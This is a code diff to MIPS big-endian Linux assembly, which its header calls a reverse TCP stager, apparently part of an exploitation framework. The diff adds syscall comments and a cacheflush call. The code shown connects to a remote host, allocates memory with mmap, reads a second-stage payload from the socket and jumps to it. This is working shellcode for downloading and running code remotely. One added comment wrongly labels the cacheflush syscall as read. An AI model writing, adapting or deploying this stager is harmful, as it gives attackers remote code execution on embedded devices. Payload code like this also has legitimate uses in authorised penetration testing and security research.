@@ -13,7 +13,7 @@
 #
 # Description:
 #
-#        Implementation of a MIPS LE Linux reverse TCP stager.
+#        Implementation of a MIPS BE Linux reverse TCP stager.
 #
 #        File descriptor in $s2.
 #
@@ -53,6 +53,7 @@ main:
 	# a0: sockfd
 	# a1: addr = AF_INET (2)
 	# a2: addrlen = 16
+	# v0: syscall = __NR_connect (4170)
 	lw      $a0, -4($sp)
 	li      $t7, -3
 	nor     $t7, $t7, $zero
@@ -75,6 +76,7 @@ main:
 	# a3: flags = MAP_PRIVATE|MAP_ANONYMOUS (2050)
 	# sp(16): fd = -1
 	# sp(20): offset = 0
+	# v0: syscall = __NR_mmap (4090)
 	li      $a0, -1
 	li      $a1, 4097
 	addi    $a1, $a1, -1
@@ -95,11 +97,25 @@ main:
 	# a0: sockfd
 	# a1: addr
 	# a2: len = 4096
+	# v0: syscall = __NR_read (4003)
 	lw      $a0, -4($sp)
 	lw      $a1, -8($sp)
 	li      $a2, 4097
 	addi    $a2, $a2, -1
 	li      $v0, 4003
+	syscall 0x40404
+
+	# cacheflush(addr, nbytes, DCACHE)
+	# a0: addr
+	# a1: nbytes
+	# a2: cache = DCACHE (2)
+	# v0: syscall = __NR_read (4147)
+	lw      $a0, -8($sp)
+	add     $a1, $v0, $zero
+	li      $t1, -3
+	nor     $t1, $t1, $0
+	add     $a2, $t1, $0
+	li      $v0, 4147
 	syscall 0x40404
 	
 	# jmp to the stage
